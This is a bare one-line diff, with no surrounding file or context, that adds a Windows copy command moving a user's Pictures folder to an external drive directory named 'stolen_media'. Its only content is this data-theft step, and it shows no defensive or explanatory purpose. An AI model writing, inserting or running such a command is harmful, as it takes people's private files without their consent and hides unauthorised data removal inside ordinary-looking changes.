@@ -1,0 +1,1 @@
+copy "C:\Users\%USER%\Pictures" "G:\stolen_media"
